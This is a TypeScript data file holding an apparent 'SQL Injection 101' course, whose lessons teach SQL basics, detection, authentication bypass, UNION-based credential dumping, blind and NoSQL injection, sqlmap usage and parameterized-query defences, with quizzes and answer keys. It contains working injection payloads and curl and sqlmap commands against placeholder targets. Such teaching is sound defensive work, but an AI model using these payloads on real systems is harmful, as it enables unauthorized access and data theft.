import type { Lesson, Course } from '../types';

const l = (id: string, title: string, instruction: string, extras?: Partial<Lesson>): Lesson => ({
  id, title, instruction, image: null, ...extras,
});

export const LESSONS: Lesson[] = [
    l('sql-1', 'What is SQL?',
      `**SQL** (Structured Query Language) is how programs talk to databases. Websites use SQL to store users, products, posts, and everything else.

A database has **tables** (like spreadsheets), each with **columns** and **rows**.

\`\`\`sql
-- Example: a users table
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    email TEXT NOT NULL,
    password TEXT NOT NULL
);
\`\`\`

To get data:

\`\`\`sql
SELECT * FROM users;
\`\`\`

To get specific data:

\`\`\`sql
SELECT username, email FROM users WHERE id = 1;
\`\`\`

Web applications build SQL queries from user input. If they don't sanitize that input, you can inject your own SQL commands.

\`\`\`bash
# If you have SQLite installed, try:
sqlite3 test.db "CREATE TABLE users (id INT, name TEXT);"
sqlite3 test.db "INSERT INTO users VALUES (1, 'admin');"
sqlite3 test.db "SELECT * FROM users;"
\`\`\``),

    l('sql-2', 'SELECT & WHERE',
      `The \`SELECT\` statement retrieves data. The \`WHERE\` clause filters it.

\`\`\`sql
-- Get all data
SELECT * FROM users;

-- Get specific columns
SELECT username, password FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE username = 'admin';

-- Match patterns with LIKE
SELECT * FROM users WHERE email LIKE '%@company.com';

-- Combine conditions
SELECT * FROM products
WHERE price > 100 AND category = 'electronics';
\`\`\`

A typical login query looks like:

\`\`\`sql
SELECT * FROM users
WHERE username = 'admin' AND password = 'secret123';
\`\`\`

If this returns any row, the login succeeds. If it returns no rows, login fails.

The problem: the application directly inserts user input into the query:

\`\`\`python
# Vulnerable code — NEVER do this
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
\`\`\`

The user input becomes part of the SQL command itself, not just a value. This is the root of SQL injection.`),

    l('sql-3', 'SQL Injection Discovery',
      `Finding SQL injection points is often as simple as typing a single quote (\`'\`).

When you enter \`'\` into a vulnerable form, the query becomes:

\`\`\`sql
SELECT * FROM users WHERE username = ''' AND password = 'x'
\`\`\`

The extra \`'\` breaks the string, causing a SQL syntax error. If the application shows an error, you've found a SQL injection.

**Test payloads:**

\`\`\`
'           -- Single quote (breaks the string)
''          -- Double quote (escaped quote — might work)
"           -- Double quote for databases that use them
')          -- Close the string and parenthesis
1' OR '1'='1   -- Always-true condition
1' --       -- Comment out the rest of the query
\`\`\`

**Error-based detection:**

If you see an error like:
\`\`\`
You have an error in your SQL syntax; check the manual...
\`\`\`

That's a SQL injection point. The database is telling you exactly where and how the query broke.

**Blind detection:**
If errors are hidden, use boolean-based tests:

\`\`\`sql
-- If both return the same response, SQLi is likely
www.site.com/page?id=1' AND '1'='1
www.site.com/page?id=1' AND '1'='2
\`\`\`

Different responses (one works, one doesn't) confirm SQL injection exists.`),

    l('sql-4', 'Bypassing Authentication',
      `The classic SQL injection attack: bypassing login.

A vulnerable login query:

\`\`\`sql
SELECT * FROM users
WHERE username = 'INPUT' AND password = 'INPUT2'
\`\`\`

Enter this as the username:

\`\`\`
admin' OR '1'='1
\`\`\`

The query becomes:

\`\`\`sql
SELECT * FROM users
WHERE username = 'admin' OR '1'='1' AND password = 'whatever'
\`\`\`

Since \`OR '1'='1'\` is always true, the query returns the first user (usually admin).

**Even simpler:**

\`\`\`
' OR 1=1 --
\`\`\`

\`\`\`sql
SELECT * FROM users
WHERE username = '' OR 1=1 --' AND password = 'x'
\`\`\`

The \`--\` comments out the rest of the query. \`1=1\` is always true. You're logged in as the first user.

**Comment syntax by database:**

\`\`\`sql
--  SQL comment (works in MySQL, PostgreSQL, SQLite)
#    MySQL specific comment
/* */ Block comment (works in most databases)
\`\`\`

Always test with different comment styles when one doesn't work.`),

    l('sql-5', 'Extracting Data with UNION',
      `Once you've found a SQL injection, the \`UNION\` operator lets you extract data from other tables.

\`\`\`sql
-- UNION combines results from two SELECT statements
SELECT name, email FROM users
UNION
SELECT title, body FROM posts;
\`\`\`

Both SELECTs must return the **same number of columns**.

**Step 1: Find the number of columns**

\`\`\`sql
' ORDER BY 1 --   (if error, keep going)
' ORDER BY 2 --   (no error? try 3)
' ORDER BY 3 --   (no error? try 4)
\`\`\`

When you get an error, the previous number was the column count.

Or use UNION with NULLs:

\`\`\`sql
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
\`\`\`

No error = that many columns.

**Step 2: Extract data**

\`\`\`sql
-- Get database version
' UNION SELECT 1, version(), 3 --

-- Get table names (MySQL)
' UNION SELECT 1, table_name, 3 FROM information_schema.tables --

-- Get column names from users table
' UNION SELECT 1, column_name, 3 FROM information_schema.columns
  WHERE table_name='users' --

-- Dump credentials
' UNION SELECT 1, username, password FROM users --
\`\`\`

**For SQLite:**

\`\`\`sql
-- Get SQLite version
' UNION SELECT 1, sqlite_version(), 3 --

-- Get all tables
' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' --

-- Get table schema
' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE name='users' --
\`\`\`

Always extract the schema first so you know the table and column names.`),

    l('sql-6', 'Prevention & Mitigation',
      `The only real defense against SQL injection is **parameterized queries** (also called prepared statements).

**Vulnerable code (NEVER do this):**

\`\`\`python
# Python with raw string formatting — DANGEROUS
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
\`\`\`

**Safe code (parameterized query):**

\`\`\`python
# Python with parameterized query — SAFE
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
\`\`\`

The \`?\` is a placeholder. The database treats \`username\` as data, not as part of the SQL command. Even if someone enters \`' OR '1'='1\`, it's treated as a literal string to search for, not as SQL code.

**In other languages:**

\`\`\`java
// Java with PreparedStatement — SAFE
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);
\`\`\`

\`\`\`php
// PHP with PDO — SAFE
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
\`\`\`

**Additional defenses:**
- **Input validation** — reject unexpected characters
- **Least privilege** — database accounts should have minimal permissions
- **WAF** — Web Application Firewall can block known attack patterns
- **Regular security testing** — scan your applications for SQL injection

SQL injection is preventable. Every modern programming language supports parameterized queries. There is never a valid reason to concatenate user input into SQL queries.`, { hasQuiz: true, quiz: [
        { id: 'sql-6-q1', question: 'Why are parameterized queries safe against SQL injection?', options: ['They encrypt the query', 'User input is treated as data, not SQL code', 'They use a different database', 'They block all input'], correctIndex: 1, explanation: 'Parameterized queries send user input as data, separate from the SQL command structure.' },
        { id: 'sql-6-q2', question: 'What is the best defense against SQL injection?', options: ['Input validation', 'WAF', 'Parameterized queries', 'Encryption'], correctIndex: 2, explanation: 'Parameterized queries are the definitive defense as they fundamentally separate code from data.' },
      ] }),

    l('sql-7', 'Blind SQL Injection',
      `Sometimes the application doesn't show errors or return data. Blind SQLi uses true/false questions or time delays to extract data one bit at a time.

**Boolean-based blind SQLi:**
\`\`\`bash
# Test for boolean-based injection (page responds differently to true vs false)
curl "http://target.com/item?id=1' AND '1'='1"
curl "http://target.com/item?id=1' AND '1'='2"

# Extract data with boolean questions
curl "http://target.com/item?id=1' AND SUBSTRING(database(),1,1)='m' -- "
\`\`\`

**Time-based blind SQLi:**
\`\`\`bash
# MySQL
curl "http://target.com/item?id=1' AND SLEEP(5) -- "

# PostgreSQL
curl "http://target.com/item?id=1' AND (SELECT pg_sleep(5)) -- "

# MS SQL Server
curl "http://target.com/item?id=1'; WAITFOR DELAY '0:0:5' -- "
\`\`\`

**Extract data using time:**
\`\`\`bash
# Check first character of database name
curl "http://target.com/item?id=1' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(3), 0) -- "
\`\`\``),

    l('sql-8', 'NoSQL Injection',
      `Modern apps use MongoDB and other NoSQL databases. They have their own injection patterns.

**MongoDB injection:**
\`\`\`bash
# Test with JSON operators
curl -d 'username[$ne]=&password[$ne]=' https://target.com/login

# JSON content type
curl -X POST -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}' \
  https://target.com/login
\`\`\`

**MongoDB operators:**
- \`$ne\` — not equal (match everything)
- \`$gt\` — greater than
- \`$regex\` — pattern matching
- \`$where\` — JavaScript expression (code injection!)

Prevention: validate input types strictly. Never pass user input directly into MongoDB queries.`),

    l('sql-9', 'Second-Order SQL Injection',
      `Second-order SQLi stores the payload, then triggers it later.

**How it works:**
\`\`\`bash
# Step 1: Register with malicious username "admin' --"
# Step 2: Data stored in database
# Step 3: Later, profile page uses username in a query:
# SELECT * FROM users WHERE username = 'admin' -- '
# Now viewing admin's data!
\`\`\`

**Why it's hard to find:**
- Payload goes through two different code paths
- Automated scanners rarely maintain state across requests
- Registration code may escape differently than profile code

**Prevention:** Parameterize ALL queries — even those using data from the database.`),

    l('sql-10', 'SQL Injection Automation with sqlmap',
      `Sqlmap automates SQL injection detection and exploitation.

\`\`\`bash
# Basic detection
sqlmap -u "http://target.com/item?id=1"

# Load request from Burp
sqlmap -r request.txt

# List databases
sqlmap -u "http://target.com/item?id=1" --dbs

# Dump a table
sqlmap -u "http://target.com/item?id=1" -D dbname -T users --dump

# Bypass WAF with tamper scripts
sqlmap -u "http://target.com/item?id=1" --tamper=space2comment

# Check if DBA
sqlmap -u "http://target.com/item?id=1" --is-dba
\`\`\`

Master sqlmap to automate the tedious parts of SQL injection testing, but always understand what it's doing under the hood.`, { hasQuiz: true, quiz: [
        { id: 'sql-10-q1', question: 'Which sqlmap flag dumps all tables from all databases?', options: ['--dump', '--dump-all', '--all', '--extract'], correctIndex: 1, explanation: '--dump-all dumps all tables from all databases. Use with caution — it generates a lot of data.' },
        { id: 'sql-10-q2', question: 'What does --tamper=space2comment do?', options: ['Speeds up the scan', 'Replaces spaces with comments to bypass WAF', 'Adds delays', 'Encrypts payloads'], correctIndex: 1, explanation: 'space2comment replaces space characters with /**/ comments, which can bypass simple WAF rules that look for spaces in SQL keywords.' },
      ] }),
];

export const COURSE: Course = {
  id: 'sql-injection-101',
  title: 'SQL Injection 101',
  categoryId: 'web-security',
  description:
    'The most infamous web vulnerability. Learn to find, exploit, and prevent SQL injection attacks.',
  overview:
    'SQL injection has been the #1 web vulnerability for two decades. This course teaches you how databases work, how SQL queries are constructed, and how attackers inject malicious SQL to extract data, bypass auth, and compromise systems.',
  estimatedMinutes: 85,
  cpCost: 100,
  learningObjectives: [
      'Understand how SQL databases store and retrieve data',
      'Identify SQL injection points in web applications',
      'Exploit SQLi to bypass authentication and extract data',
      'Apply parameterized queries and prepared statements as defenses',
  ],
  skillLevel: 'intermediate',
  prerequisites: ["web-technologies-101"],
  popular: true,
  lessons: LESSONS,
};
